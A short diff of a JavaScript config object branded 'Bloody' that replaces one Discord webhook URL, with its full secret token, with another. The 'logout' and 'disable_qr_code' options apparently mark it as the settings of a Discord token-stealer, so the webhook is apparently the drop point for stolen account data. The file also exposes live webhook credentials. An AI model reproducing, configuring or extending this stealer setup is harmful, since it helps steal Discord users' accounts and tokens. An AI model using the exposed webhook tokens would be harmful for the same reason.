@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "Bloody",
 
-    webhook: "https://discord.com/api/webhooks/1154214779758575698/lsT8at3y9VvmHQ3wGZISxEgLcfENuKDxV5LY6jaCe63WnI2mMrJUpgpo2ihRIS6FKZAg",
+    webhook: "https://discord.com/api/webhooks/1155166824007225344/lzPq07AgVYqTjUj6vP_9tKlz4sgT7PzI5cjCHgVexoijdwSIKK8QnogjCpkWYjnD3ky2",
 
     logout: false,
     disable_qr_code: false,
